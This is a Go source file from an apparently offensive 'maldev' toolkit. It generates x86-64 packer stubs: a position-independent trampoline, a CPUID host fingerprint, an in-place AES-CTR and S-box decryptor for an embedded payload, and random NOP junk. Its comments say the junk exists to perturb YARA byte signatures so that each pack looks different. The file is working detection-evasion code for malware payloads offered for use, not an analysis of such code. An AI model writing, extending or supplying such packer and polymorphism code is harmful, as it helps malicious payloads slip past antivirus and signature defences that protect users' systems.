package packer

import (
	"fmt"
	mathrand "math/rand"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
)

// slotARngSeedMask is XORed with the operator seed to derive an
// independent rng for slot A (post-Encode byte splice). Slots B and C
// use the raw seed directly. Stepping the two rngs independently
// means adding a fourth slot later won't reshuffle the byte choices
// for slots A/B/C — operators who pin reproducible packs (e.g. for
// red-team artefact provenance) keep getting the same bytes from
// pre-existing slots when a new slot lands. The exact mask value is
// not security-relevant; any non-zero 64-bit constant decorrelates
// the two rng streams. 0x5a5a… is a recognisable IBCC-style ramp.
const slotARngSeedMask int64 = 0x5a5a5a5a5a5a5a5a

// splitSeedRngs derives independent rngs for in-Builder slots (bRng,
// for slots B and C) and the post-Encode byte-splice slot (aRng).
// seed == 0 returns (nil, nil) — deterministic no-junk emission.
// Both rngs use [math/rand], which is fine here: the slot bytes are
// inert NOPs whose only purpose is to perturb yara byte hashes, not
// to resist key-recovery.
func splitSeedRngs(seed int64) (bRng, aRng *mathrand.Rand) {
	if seed == 0 {
		return nil, nil
	}
	return mathrand.New(mathrand.NewSource(seed)),
		mathrand.New(mathrand.NewSource(seed ^ slotARngSeedMask))
}

// bundleStubPICImmPos is the byte offset of the imm32 immediate in
// the PIC trampoline emitted by [emitBundlePICTrampoline]. Operators
// patch this position post-encode with the distance from the .pic
// label to the bundle base. Mirrors [bundleOffsetImm32Pos] but lives
// next to the emitter for locality.
const bundleStubPICImmPos = 10

// emitBundlePICTrampoline emits the canonical 14-byte position-
// independent prologue shared by every V2-family stub:
//
//	call .pic              ; e8 00 00 00 00  — push next-instr addr
//	pop  r15               ; 41 5f            — read it into R15
//	add  r15, imm32        ; 49 81 c7 …      — patched post-encode
//
// The imm32 placeholder is zero; the wrap layer rewrites it via
// bundleStubPICImmPos. Returns the imm32 offset so callers can
// thread it back to their own immPos return value (kept for API
// symmetry with the pre-extraction code).
func emitBundlePICTrampoline(b *amd64.Builder) (int, error) {
	if err := b.RawBytes([]byte{
		0xe8, 0x00, 0x00, 0x00, 0x00, // call .pic
		0x41, 0x5f, // pop r15
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00, // add r15, imm32
	}); err != nil {
		return 0, fmt.Errorf("packer: PIC trampoline: %w", err)
	}
	return bundleStubPICImmPos, nil
}

// emitCPUIDVendorPrologue emits the 12-byte CPUID-leaf-0 vendor read
// into a 16-byte stack scratch and pins the scratch pointer in RSI:
//
//	sub  rsp, 16
//	mov  rdi, rsp
//	xor  eax, eax
//	cpuid                                    ; EAX=0 → EBX,EDX,ECX
//	mov  [rdi+0],  ebx                       ; "Genu" / "Auth" / …
//	mov  [rdi+4],  edx
//	mov  [rdi+8],  ecx
//	mov  rsi, rdi                            ; vendor pointer
//
// Shared by every V2-family stub (Linux + Windows). Leaves the
// upper 4 bytes of the scratch slot unused — [emitCPUIDFeaturesProbe]
// fills them with CPUID[1].ECX immediately after.
func emitCPUIDVendorPrologue(b *amd64.Builder) error {
	if err := b.SUB(amd64.RSP, amd64.Imm(16)); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue sub rsp: %w", err)
	}
	if err := b.MOV(amd64.RDI, amd64.RSP); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov rdi rsp: %w", err)
	}
	if err := b.XOR(amd64.RAX, amd64.RAX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue xor eax: %w", err)
	}
	if err := b.RawBytes([]byte{0x0f, 0xa2}); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue cpuid: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI}, amd64.RBX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov [rdi] ebx: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI, Disp: 4}, amd64.RDX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov [rdi+4] edx: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI, Disp: 8}, amd64.RCX); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov [rdi+8] ecx: %w", err)
	}
	if err := b.MOV(amd64.RSI, amd64.RDI); err != nil {
		return fmt.Errorf("packer: CPUID vendor prologue mov rsi rdi: %w", err)
	}
	return nil
}

// emitCPUIDFeaturesProbe emits CPUID-leaf-1 (feature flags) and
// stashes ECX at [rdi+12]:
//
//	mov  eax, 1                              ; CPUID leaf 1
//	cpuid                                    ; EAX,EBX,ECX,EDX
//	mov  [rdi+12], ecx                       ; ECX = feature flags 1
//
// Reads PT_CPUID_FEATURES inputs — the 4-byte slot lives in the
// unused tail of the 16-byte stack scratch allocated by
// [emitCPUIDVendorPrologue]. Must be called AFTER the vendor
// prologue (relies on RDI still pointing at the scratch).
func emitCPUIDFeaturesProbe(b *amd64.Builder) error {
	if err := b.RawBytes([]byte{0xb8, 0x01, 0x00, 0x00, 0x00}); err != nil {
		return fmt.Errorf("packer: CPUID features probe mov eax 1: %w", err)
	}
	if err := b.RawBytes([]byte{0x0f, 0xa2}); err != nil {
		return fmt.Errorf("packer: CPUID features probe cpuid: %w", err)
	}
	if err := b.MOVL(amd64.MemOp{Base: amd64.RDI, Disp: 12}, amd64.RCX); err != nil {
		return fmt.Errorf("packer: CPUID features probe mov [rdi+12] ecx: %w", err)
	}
	return nil
}

// emitBundleLoopSetup emits the per-stub scan-loop initialiser:
//
//	movzx ecx, word [r15+6]   ; entry count (BundleHeader.Count)
//	mov   r8d, [r15+8]        ; entries RVA (relative to bundle base)
//	add   r8,  r15            ; → absolute entries pointer
//	xor   eax, eax            ; loop counter
//
// Reads the FingerprintEntry table location from the BundleHeader
// (R15 already points at the bundle base, set up by the PIC
// trampoline + post-encode imm32 patch). Shared by V2-Negate and
// V2NW; bytes are identical.
func emitBundleLoopSetup(b *amd64.Builder) error {
	if err := b.MOVZWL(amd64.RCX, amd64.MemOp{Base: amd64.R15, Disp: 6}); err != nil {
		return fmt.Errorf("packer: loop setup movzx ecx: %w", err)
	}
	if err := b.MOVL(amd64.R8, amd64.MemOp{Base: amd64.R15, Disp: 8}); err != nil {
		return fmt.Errorf("packer: loop setup mov r8d: %w", err)
	}
	if err := b.ADD(amd64.R8, amd64.R15); err != nil {
		return fmt.Errorf("packer: loop setup add r8 r15: %w", err)
	}
	if err := b.XOR(amd64.RAX, amd64.RAX); err != nil {
		return fmt.Errorf("packer: loop setup xor eax: %w", err)
	}
	return nil
}

// emitAESCTRBlockDecrypt emits one 16-byte AES-CTR block-decrypt
// step. Used by Tier 🟡 #2.2 Phase 3b (stub asm dispatch — queued)
// when the matched PayloadEntry's CipherType field is
// [CipherTypeAESCTR].
//
// Register contract (caller-set):
//
//	RDI  → plaintext-output cursor (16 bytes will be written)
//	RSI  → ciphertext-input cursor (16 bytes will be read)
//	R8   → AES-128 expanded round keys (11 × 16 B = 176 B,
//	       host-side via crypto/aes pre-expansion)
//	XMM0 = current 128-bit counter (caller increments per block)
//
// Clobbers: XMM1 (working keystream), XMM2 (round-key + ciphertext
// scratch). The XMM0 counter is read-only here — the increment lives
// in the caller's loop (operator may want little-endian byte-wise
// increment matching RFC 3686 or big-endian per NIST SP 800-38A;
// the choice belongs to the pack-time IV layout).
//
// Sequence (AES-128, 10 rounds):
//
//	pxor   xmm1, xmm1                 ; zero keystream working reg
//	pxor   xmm1, xmm0                 ; copy counter
//	movdqu xmm2, [r8 + 0]             ; round key 0
//	pxor   xmm1, xmm2                 ; initial whitening
//	for round = 1..9:
//	    movdqu xmm2, [r8 + 16*round]
//	    aesenc xmm1, xmm2
//	movdqu xmm2, [r8 + 160]           ; round key 10
//	aesenclast xmm1, xmm2             ; xmm1 = AES_K(counter)
//	movdqu xmm2, [rsi]                ; ciphertext block
//	pxor   xmm2, xmm1                 ; XOR keystream
//	movdqu [rdi], xmm2                ; plaintext out
//
// Total: 148 bytes of asm per block. AES-NI is mandatory — caller
// MUST gate this path on the CPUID AES bit (PT_CPUID_FEATURES with
// mask 0x02000000 covers it).
func emitAESCTRBlockDecrypt(b *amd64.Builder) error {
	// Copy counter (xmm0) → working register (xmm1) via clear+xor.
	// (golang-asm doesn't expose a clean MOVDQA reg-reg in our
	// wrapper; pxor self + pxor src is one byte longer than movdqa
	// but stays inside Builder's existing surface.)
	if err := b.PXOR(amd64.X1, amd64.X1); err != nil {
		return fmt.Errorf("packer: aes-ctr clear xmm1: %w", err)
	}
	if err := b.PXOR(amd64.X1, amd64.X0); err != nil {
		return fmt.Errorf("packer: aes-ctr copy counter: %w", err)
	}
	// Round 0 whitening.
	if err := b.MOVDQULoad(amd64.X2, amd64.MemOp{Base: amd64.R8, Disp: 0}); err != nil {
		return fmt.Errorf("packer: aes-ctr load rk0: %w", err)
	}
	if err := b.PXOR(amd64.X1, amd64.X2); err != nil {
		return fmt.Errorf("packer: aes-ctr whiten: %w", err)
	}
	// Rounds 1..9 — full AESENC.
	for round := 1; round <= 9; round++ {
		if err := b.MOVDQULoad(amd64.X2, amd64.MemOp{Base: amd64.R8, Disp: int32(16 * round)}); err != nil {
			return fmt.Errorf("packer: aes-ctr load rk%d: %w", round, err)
		}
		if err := b.AESENC(amd64.X1, amd64.X2); err != nil {
			return fmt.Errorf("packer: aes-ctr aesenc round %d: %w", round, err)
		}
	}
	// Round 10 — AESENCLAST.
	if err := b.MOVDQULoad(amd64.X2, amd64.MemOp{Base: amd64.R8, Disp: 160}); err != nil {
		return fmt.Errorf("packer: aes-ctr load rk10: %w", err)
	}
	if err := b.AESENCLAST(amd64.X1, amd64.X2); err != nil {
		return fmt.Errorf("packer: aes-ctr aesenclast: %w", err)
	}
	// Apply keystream + store.
	if err := b.MOVDQULoad(amd64.X2, amd64.MemOp{Base: amd64.RSI}); err != nil {
		return fmt.Errorf("packer: aes-ctr load ciphertext: %w", err)
	}
	if err := b.PXOR(amd64.X2, amd64.X1); err != nil {
		return fmt.Errorf("packer: aes-ctr xor keystream: %w", err)
	}
	if err := b.MOVDQUStore(amd64.MemOp{Base: amd64.RDI}, amd64.X2); err != nil {
		return fmt.Errorf("packer: aes-ctr store plaintext: %w", err)
	}
	return nil
}

// emitAESCTRDecryptLoop emits the V2NW matched-payload AES-CTR
// decrypt loop. Called from V2NW when the matched PayloadEntry's
// CipherType byte == [CipherTypeAESCTR] (Tier 🟡 #2.2 Phase 3c).
//
// Register contract on entry:
//   RCX = matched PayloadEntry pointer (canonical, set by matched
//         block before this helper)
//   RDI = absolute ciphertext-region start (= entry data RVA + R15;
//         points at the IV bytes)
//
// Register contract on exit:
//   Plaintext written in-place starting 16 bytes after the original
//   RDI (i.e. immediately after the IV). RDI advanced to the
//   round-key region. Caller's .jmp_payload epilogue reloads RDI
//   from [RCX]+R15 (data RVA) before final JMP, so RDI's exit
//   value is intentionally clobberable.
//
// Clobbers: XMM0 (counter), XMM1, XMM2 (per emitAESCTRBlockDecrypt),
// RAX (counter-increment scratch), RDX (ciphertext length scratch),
// R8 (round keys ptr), R9 (loop counter), RSI (ciphertext source).
//
// Sequence overview:
//   movdqu xmm0, [rdi]         ; XMM0 = IV (128-bit BE counter init)
//   add  rdi, 16               ; skip past IV
//   mov  edx, [rcx+4]          ; edx = DataSize
//   sub  rdx, 192              ; 16 IV + 176 round keys
//   mov  r8, rdi
//   add  r8, rdx               ; r8 = round-keys pointer
//   mov  rsi, rdi              ; rsi = ciphertext source (in-place)
//   mov  r9, rdx               ; r9 = remaining bytes
//   .aes_loop:
//     test r9, r9
//     jz   .aes_done
//     emitAESCTRBlockDecrypt   ; 148 B — decrypts 16-byte block
//     ; counter increment (BE 64-bit low half via BSWAP)
//     sub  rsp, 16
//     movdqu [rsp], xmm0
//     mov  rax, [rsp+8]
//     bswap rax
//     inc  rax
//     bswap rax
//     mov  [rsp+8], rax
//     movdqu xmm0, [rsp]
//     add  rsp, 16
//     ; advance
//     add  rdi, 16
//     add  rsi, 16
//     sub  r9, 16
//     jmp  .aes_loop
//   .aes_done:
//
// The 64-bit-only counter assumption holds for any plaintext shorter
// than 2^64 * 16 B = 256 EB — every realistic maldev payload. Counter
// wrap would require 32-bit-precision BE add with carry into the
// high half; out of scope for v0.92.
//
// Uses labels "aes_loop" + "aes_done" — caller MUST NOT collide with
// these names in its own b.Label() calls or the resolver hits an
// "ambiguous label" panic at Encode time.
func emitAESCTRDecryptLoop(b *amd64.Builder) error {
	emit := func(op string, err error) error {
		if err != nil {
			return fmt.Errorf("packer: aes-ctr loop %s: %w", op, err)
		}
		return nil
	}
	// Setup.
	if err := emit("movdqu xmm0 [rdi]", b.MOVDQULoad(amd64.X0, amd64.MemOp{Base: amd64.RDI})); err != nil {
		return err
	}
	if err := emit("add rdi 16", b.ADD(amd64.RDI, amd64.Imm(16))); err != nil {
		return err
	}
	if err := emit("mov edx [rcx+4]", b.MOVL(amd64.RDX, amd64.MemOp{Base: amd64.RCX, Disp: 4})); err != nil {
		return err
	}
	if err := emit("sub rdx 192", b.SUB(amd64.RDX, amd64.Imm(192))); err != nil {
		return err
	}
	if err := emit("mov r8 rdi", b.MOV(amd64.R8, amd64.RDI)); err != nil {
		return err
	}
	if err := emit("add r8 rdx", b.ADD(amd64.R8, amd64.RDX)); err != nil {
		return err
	}
	if err := emit("mov rsi rdi", b.MOV(amd64.RSI, amd64.RDI)); err != nil {
		return err
	}
	if err := emit("mov r9 rdx", b.MOV(amd64.R9, amd64.RDX)); err != nil {
		return err
	}

	loopLbl := b.Label("aes_loop")
	doneLbl := amd64.LabelRef("aes_done")
	if err := emit("test r9 r9", b.TEST(amd64.R9, amd64.R9)); err != nil {
		return err
	}
	if err := emit("je aes_done", b.JE(doneLbl)); err != nil {
		return err
	}
	if err := emitAESCTRBlockDecrypt(b); err != nil {
		return fmt.Errorf("packer: aes-ctr loop body: %w", err)
	}
	// Counter increment.
	if err := emit("sub rsp 16", b.SUB(amd64.RSP, amd64.Imm(16))); err != nil {
		return err
	}
	if err := emit("movdqu [rsp] xmm0", b.MOVDQUStore(amd64.MemOp{Base: amd64.RSP}, amd64.X0)); err != nil {
		return err
	}
	if err := emit("mov rax [rsp+8]", b.MOV(amd64.RAX, amd64.MemOp{Base: amd64.RSP, Disp: 8})); err != nil {
		return err
	}
	if err := emit("bswap rax #1", b.BSWAP(amd64.RAX)); err != nil {
		return err
	}
	if err := emit("inc rax", b.INC(amd64.RAX)); err != nil {
		return err
	}
	if err := emit("bswap rax #2", b.BSWAP(amd64.RAX)); err != nil {
		return err
	}
	if err := emit("mov [rsp+8] rax", b.MOV(amd64.MemOp{Base: amd64.RSP, Disp: 8}, amd64.RAX)); err != nil {
		return err
	}
	if err := emit("movdqu xmm0 [rsp]", b.MOVDQULoad(amd64.X0, amd64.MemOp{Base: amd64.RSP})); err != nil {
		return err
	}
	if err := emit("add rsp 16", b.ADD(amd64.RSP, amd64.Imm(16))); err != nil {
		return err
	}
	// Advance pointers + remaining size.
	if err := emit("add rdi 16 #2", b.ADD(amd64.RDI, amd64.Imm(16))); err != nil {
		return err
	}
	if err := emit("add rsi 16", b.ADD(amd64.RSI, amd64.Imm(16))); err != nil {
		return err
	}
	if err := emit("sub r9 16", b.SUB(amd64.R9, amd64.Imm(16))); err != nil {
		return err
	}
	if err := emit("jmp aes_loop", b.JMP(loopLbl)); err != nil {
		return err
	}
	b.Label("aes_done")
	return nil
}

// emitNopJunk emits a small random sequence of Intel multi-byte NOPs
// directly into the Builder stream. Used for in-stub polymorphism
// slots (B and C) in V2-family bundle stubs — yara byte-pattern
// signatures across packs differ even when the algorithmic body is
// identical. Caller-supplied rng for test determinism; nil rng emits
// zero bytes (no-op). Total inserted: [4, 16) bytes per call — small
// enough that slots B and C together stay under one cacheline of
// stub-size overhead while still spanning a single yara hit window.
//
// Distinct from [injectStubJunk] which performs a post-Encode byte
// splice at slot A (offset 14). emitNopJunk runs DURING Builder
// emission, so any forward Jcc displacements crossing the junk are
// auto-resolved by Builder's label resolver — no offset bookkeeping
// required.
func emitNopJunk(b *amd64.Builder, r *mathrand.Rand) error {
	if r == nil {
		return nil
	}
	target := 4 + r.Intn(12) // [4, 16)
	junk := make([]byte, 0, target)
	for len(junk) < target {
		remaining := target - len(junk)
		maxSize := remaining
		if maxSize > len(intelNops) {
			maxSize = len(intelNops)
		}
		size := 1 + r.Intn(maxSize)
		junk = append(junk, intelNops[size-1]...)
	}
	if err := b.RawBytes(junk); err != nil {
		return fmt.Errorf("packer: emit nop junk: %w", err)
	}
	return nil
}

// emitDecryptStep emits the 6-instruction SBox-indirection decrypt
// step used by every V2-family bundle stub (plain V2, V2-Negate,
// V2NW). The block consumes one ciphertext byte at [rdi], folds the
// round index in r9b through a 16-entry SBox at [r8], and writes the
// plaintext back. The exact Intel-syntax sequence:
//
//	mov   al, [rdi]
//	mov   dl, r9b
//	and   dl, 15            ; SBox is 16 entries
//	movzx edx, dl
//	xor   al, [r8+rdx]
//	mov   [rdi], al
//
// The 17-byte output is byte-identical to the pre-#2.1 RawBytes blob
// it replaces — encoder unit tests in pe/packer/stubgen/amd64 pin the
// emission for each of the 6 calls.
func emitDecryptStep(b *amd64.Builder) error {
	emit := func(op string, err error) error {
		if err != nil {
			return fmt.Errorf("packer: decrypt step %s: %w", op, err)
		}
		return nil
	}
	if err := emit("mov al [rdi]", b.MOVBReg(amd64.RAX, amd64.MemOp{Base: amd64.RDI})); err != nil {
		return err
	}
	if err := emit("mov dl r9b", b.MOVBReg(amd64.RDX, amd64.R9)); err != nil {
		return err
	}
	if err := emit("and dl 15", b.ANDB(amd64.RDX, amd64.Imm(0x0f))); err != nil {
		return err
	}
	if err := emit("movzx edx dl", b.MOVZBL(amd64.RDX, amd64.RDX)); err != nil {
		return err
	}
	if err := emit("xor al [r8+rdx]", b.XORB(amd64.RAX, amd64.MemOp{Base: amd64.R8, Index: amd64.RDX, Scale: 1})); err != nil {
		return err
	}
	if err := emit("mov [rdi] al", b.MOVB(amd64.MemOp{Base: amd64.RDI}, amd64.RAX)); err != nil {
		return err
	}
	return nil
}
